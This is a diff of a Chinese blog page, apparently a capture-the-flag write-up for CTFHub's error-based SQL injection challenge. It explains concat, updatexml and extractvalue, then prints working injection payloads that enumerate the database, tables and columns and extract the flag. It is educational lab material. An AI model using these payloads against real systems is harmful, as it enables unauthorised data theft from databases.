@@ -5,7 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="CTFHub-报错注入, 是小竹不是小猪">
-    <meta name="description" content="1 SQL语句基本知识1.1基本函数1.1.1 concat函数12345678910111213SQL&amp;gt; SELECT * FROM employee_tbl;+------+------+------------+--------">
+    <meta name="description" content="1 SQL语句基本知识1.1基本函数1.1.1 concat函数SQL&amp;gt; SELECT * FROM employee_tbl;
++------+------+------------+--------------------+
+| ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -463,17 +465,40 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-SQL语句基本知识"><a href="#1-SQL语句基本知识" class="headerlink" title="1 SQL语句基本知识"></a>1 SQL语句基本知识</h2><h2 id="1-1基本函数"><a href="#1-1基本函数" class="headerlink" title="1.1基本函数"></a>1.1基本函数</h2><h4 id="1-1-1-concat函数"><a href="#1-1-1-concat函数" class="headerlink" title="1.1.1 concat函数"></a>1.1.1 concat函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name <span class="operator">|</span> work_date  <span class="operator">|</span> daily_typing_pages <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> John <span class="operator">|</span> <span class="number">2007</span><span class="number">-01</span><span class="number">-24</span> <span class="operator">|</span>                <span class="number">250</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> Ram  <span class="operator">|</span> <span class="number">2007</span><span class="number">-05</span><span class="number">-27</span> <span class="operator">|</span>                <span class="number">220</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> Jack <span class="operator">|</span> <span class="number">2007</span><span class="number">-05</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">170</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> Jack <span class="operator">|</span> <span class="number">2007</span><span class="number">-04</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">100</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> Jill <span class="operator">|</span> <span class="number">2007</span><span class="number">-04</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">220</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> Zara <span class="operator">|</span> <span class="number">2007</span><span class="number">-06</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">300</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> Zara <span class="operator">|</span> <span class="number">2007</span><span class="number">-02</span><span class="number">-06</span> <span class="operator">|</span>                <span class="number">350</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------------+--------------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT(id, name, work_date)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> CONCAT(id, name, work_date) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>John2007<span class="number">-01</span><span class="number">-24</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>Ram2007<span class="number">-05</span><span class="number">-27</span>              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>Jack2007<span class="number">-05</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>Jack2007<span class="number">-04</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>Jill2007<span class="number">-04</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>Zara2007<span class="number">-06</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>Zara2007<span class="number">-02</span><span class="number">-06</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
+                <h2 id="1-SQL语句基本知识"><a href="#1-SQL语句基本知识" class="headerlink" title="1 SQL语句基本知识"></a>1 SQL语句基本知识</h2><h2 id="1-1基本函数"><a href="#1-1基本函数" class="headerlink" title="1.1基本函数"></a>1.1基本函数</h2><h4 id="1-1-1-concat函数"><a href="#1-1-1-concat函数" class="headerlink" title="1.1.1 concat函数"></a>1.1.1 concat函数</h4><pre><code class="sql">SQL&gt; SELECT * FROM employee_tbl;
++------+------+------------+--------------------+
+| id   | name | work_date  | daily_typing_pages |
++------+------+------------+--------------------+
+|    1 | John | 2007-01-24 |                250 |
+|    2 | Ram  | 2007-05-27 |                220 |
+|    3 | Jack | 2007-05-06 |                170 |
+|    3 | Jack | 2007-04-06 |                100 |
+|    4 | Jill | 2007-04-06 |                220 |
+|    5 | Zara | 2007-06-06 |                300 |
+|    5 | Zara | 2007-02-06 |                350 |
++------+------+------------+--------------------+
+7 rows in set (0.00 sec)
+</code></pre>
+<pre><code class="sql">SQL&gt; SELECT CONCAT(id, name, work_date)
+    -&gt; FROM employee_tbl;
++-----------------------------+
+| CONCAT(id, name, work_date) |
++-----------------------------+
+| 1John2007-01-24             |
+| 2Ram2007-05-27              |
+| 3Jack2007-05-06             |
+| 3Jack2007-04-06             |
+| 4Jill2007-04-06             |
+| 5Zara2007-06-06             |
+| 5Zara2007-02-06             |
++-----------------------------+
+7 rows in set (0.00 sec)
+</code></pre>
 <h4 id="1-1-2-Floor函数"><a href="#1-1-2-Floor函数" class="headerlink" title="1.1.2 Floor函数"></a>1.1.2 Floor函数</h4><p>函数返回小于x的最大整数值。</p>
-<h4 id="1-1-3-DATEDIFF-函数"><a href="#1-1-3-DATEDIFF-函数" class="headerlink" title="1.1.3 DATEDIFF()函数"></a>1.1.3 DATEDIFF()函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATEDIFF(<span class="keyword">day</span>,<span class="string">&#x27;2008-12-29&#x27;</span>,<span class="string">&#x27;2008-12-30&#x27;</span>) <span class="keyword">AS</span> DiffDate  #返回<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1-1-4-LEFT-和RIGHT"><a href="#1-1-4-LEFT-和RIGHT" class="headerlink" title="1.1.4 LEFT()和RIGHT()"></a>1.1.4 LEFT()和RIGHT()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;SQL Server&#x27;</span>,<span class="number">3</span>) result_string;</span><br></pre></td></tr></table></figure>
-
-
-
+<h4 id="1-1-3-DATEDIFF-函数"><a href="#1-1-3-DATEDIFF-函数" class="headerlink" title="1.1.3 DATEDIFF()函数"></a>1.1.3 DATEDIFF()函数</h4><pre><code class="sql">SELECT DATEDIFF(day,&#39;2008-12-29&#39;,&#39;2008-12-30&#39;) AS DiffDate  #返回1
+</code></pre>
+<h4 id="1-1-4-LEFT-和RIGHT"><a href="#1-1-4-LEFT-和RIGHT" class="headerlink" title="1.1.4 LEFT()和RIGHT()"></a>1.1.4 LEFT()和RIGHT()</h4><pre><code class="sql">SELECT LEFT(&#39;SQL Server&#39;,3) result_string;
+</code></pre>
 <table>
 <thead>
 <tr>
@@ -501,8 +526,8 @@
 <h3 id="1-2-updatexml-函数报错注入原理"><a href="#1-2-updatexml-函数报错注入原理" class="headerlink" title="1.2 updatexml() 函数报错注入原理"></a>1.2 updatexml() 函数报错注入原理</h3><h5 id="1-2-1-updatexml-函数定义"><a href="#1-2-1-updatexml-函数定义" class="headerlink" title="1.2.1 updatexml() 函数定义"></a>1.2.1 updatexml() 函数定义</h5><p>UPDATEXML (XML_document, XPath_string, new_value);</p>
 <p>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据；</p>
 <h5 id="1-2-2-updatexml-函数运行机制"><a href="#1-2-2-updatexml-函数运行机制" class="headerlink" title="1.2.2 updatexml() 函数运行机制"></a>1.2.2 updatexml() 函数运行机制</h5><p>该函数对XPath_string进行查询操作，如果符合语法格式要求，则用第三个参数替换，不符合语法格式要求，则会报错并带出查询的结果。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;c&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;/a&#x27;</span>,<span class="string">&#x27;&lt;a&gt;b&lt;/a&gt;&#x27;</span>); #正常<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">select updatexml(&#39;&lt;a&gt;c&lt;/a&gt;&#39;,&#39;/a&#39;,&#39;&lt;a&gt;b&lt;/a&gt;&#39;); #正常SQL语句
+</code></pre>
 <p>根据xpath语法规则，/、//、.、…、@都是合法的字符，要是函数报错需要使用以上字符之外的字符。</p>
 <table>
 <thead>
@@ -536,54 +561,71 @@
 <td>选取属性。</td>
 </tr>
 </tbody></table>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> updatexml(<span class="string">&#x27;&lt;a&gt;c&lt;/a&gt;&#x27;</span>,<span class="string">&#x27;~x~&#x27;</span>,<span class="string">&#x27;&lt;a&gt;b&lt;/a&gt;&#x27;</span>); #用<span class="string">&#x27;~x~&#x27;</span>或着 <span class="string">&#x27;#x#&#x27;</span>，<span class="number">0x7e</span>是<span class="operator">~</span>，<span class="number">0x23</span>是#</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="sql">select updatexml(&#39;&lt;a&gt;c&lt;/a&gt;&#39;,&#39;~x~&#39;,&#39;&lt;a&gt;b&lt;/a&gt;&#39;); #用&#39;~x~&#39;或着 &#39;#x#&#39;，0x7e是~，0x23是#
+</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20201009185844149.png#" alt="img"></p>
 <h3 id="1-3-extractvalue（）函数运行机制"><a href="#1-3-extractvalue（）函数运行机制" class="headerlink" title="1.3 extractvalue（）函数运行机制"></a>1.3 extractvalue（）函数运行机制</h3><p>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串)；<br>作用：从目标XML中返回包含所查询值的字符串；</p>
 <p>正常输入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;ccc&lt;b&gt;ddd&lt;/b&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a&#x27;</span>) ;</span><br><span class="line">#从<span class="operator">&lt;</span>a<span class="operator">&gt;</span>ccc<span class="operator">&lt;</span>b<span class="operator">&gt;</span>ddd<span class="operator">&lt;</span><span class="operator">/</span>b<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>a<span class="operator">&gt;</span>中查找a结点下的字符串</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">select extractvalue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;/b&gt;&lt;/a&gt;&#39;, &#39;/a&#39;) ;
+#从&lt;a&gt;ccc&lt;b&gt;ddd&lt;/b&gt;&lt;/a&gt;中查找a结点下的字符串
+</code></pre>
 <p>报错输入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">sql</span>语句),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">?id=2 and extractvalue(null,concat(0x7e,(sql语句),0x7e))
+</code></pre>
 <h3 id="1-4-利用-count-、rand-、group-by-测试ctfhub的报错注入"><a href="#1-4-利用-count-、rand-、group-by-测试ctfhub的报错注入" class="headerlink" title="1.4 利用 (count()、rand()、group by)测试ctfhub的报错注入"></a>1.4 利用 (count()、rand()、group by)测试ctfhub的报错注入</h3><p>原理可以参考 <a target="_blank" rel="noopener" href="https://www.2cto.com/article/201604/498394.html">https://www.2cto.com/article/201604/498394.html</a></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line">#判断是否有报错输入</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="sql">1 union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x
+#判断是否有报错输入
+</code></pre>
 <h2 id="2-ctfhub-SQL报错注入"><a href="#2-ctfhub-SQL报错注入" class="headerlink" title="2  ctfhub-SQL报错注入"></a>2  ctfhub-SQL报错注入</h2><p>使用三种方法</p>
 <p>输入1进行查询</p>
 <p><img src="/2021/11/12/b1112/1.PNG" alt="1"></p>
-<h4 id="爆破库"><a href="#爆破库" class="headerlink" title="爆破库"></a>爆破库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>));</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),database()) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
-
+<h4 id="爆破库"><a href="#爆破库" class="headerlink" title="爆破库"></a>爆破库</h4><pre><code class="sql">1 and extractvalue(null,concat(0x7e,(database()),0x7e));
+#或者
+1 union select updatexml(1,concat(0x7e,database(),0x7e),1);
+#或者
+1 union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x
+</code></pre>
 <p><img src="/2021/11/12/b1112/2.PNG" alt="2"></p>
-<h4 id="爆破表"><a href="#爆破表" class="headerlink" title="爆破表"></a>爆破表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>));#第一张news</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>));#第二个flag</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;sqli&quot;) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br><span class="line">#爆表<span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x #爆表<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<h4 id="爆破表"><a href="#爆破表" class="headerlink" title="爆破表"></a>爆破表</h4><pre><code class="sql">1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e));#第一张news
+1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e));#第二个flag
 
+1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e),1)
 
+#或者
+1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from information_schema.tables where table_schema=&quot;sqli&quot;) ,0x7e),1);
 
-
-
+#或者
+1 union select count(*),concat(floor(rand(0)*2),(select concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1)) x from information_schema.schemata group by x
+#爆表1
+1 union select count(*),concat(floor(rand(0)*2),(select concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; limit 1,1)) x from information_schema.schemata group by x #爆表2
+</code></pre>
 <p><img src="/2021/11/12/b1112/3.PNG" alt="3"></p>
 <p><img src="/2021/11/12/b1112/4.PNG" alt="4"></p>
 <p><img src="/2021/11/12/b1112/5.PNG" alt="5"></p>
-<h4 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;flag&quot;) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
-
-
-
+<h4 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h4><pre><code class="sql">1 and extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1),0x7e))
+#或者
+1 union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name=&quot;flag&quot;) ,0x7e),1);
+1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;flag&#39; limit 0,1),0x7e),1)
+#或者
+1 union select count(*),concat(floor(rand(0)*2),(select concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; and table_name=&#39;flag&#39; limit 0,1)) x from information_schema.schemata group by x
+</code></pre>
 <p><img src="/2021/11/12/b1112/5.1.PNG" alt="5.1"></p>
 <p><img src="/2021/11/12/b1112/5.2.PNG" alt="5.2"></p>
-<h4 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, (<span class="keyword">select</span>(group_concat(flag)) <span class="keyword">from</span> sqli.flag) ,<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">#或者</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),<span class="number">0x3a</span>,(<span class="keyword">select</span> concat(flag) <span class="keyword">from</span> sqli.flag limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
-
+<h4 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h4><pre><code class="sql">1 and extractvalue(null,concat(0x7e,(select flag from flag limit 0,1),0x7e))
+#或者
+1 union select updatexml(1,concat(0x7e, (select(group_concat(flag)) from sqli.flag) ,0x7e),1);
+1 and updatexml(1,concat(0x7e,(select flag from flag limit 0,1),0x7e),1)
+#或者
+1 union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(flag) from sqli.flag limit 0,1)) x from information_schema.schemata group by x
+</code></pre>
 <p><img src="/2021/11/12/b1112/5.3.PNG" alt="5.3"></p>
 <p><img src="/2021/11/12/b1112/5.4.PNG" alt="5.4"></p>
 <h4 id="长度问题"><a href="#长度问题" class="headerlink" title="长度问题"></a>长度问题</h4><p>MID函数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(column_name,<span class="keyword">start</span>[,length]) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">select mid(column_name,start[,length]) from table_name;
+</code></pre>
 <p>right函数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, <span class="keyword">right</span>((<span class="keyword">select</span>(group_concat(flag)) <span class="keyword">from</span> sqli.flag) ,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">1 union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from sqli.flag) ,31),0x7e),1);
+</code></pre>
 <p><img src="/2021/11/12/b1112/6.PNG" alt="6"></p>
 <p><img src="/2021/11/12/b1112/7.PNG" alt="7"></p>
 <p>参考资料：</p>
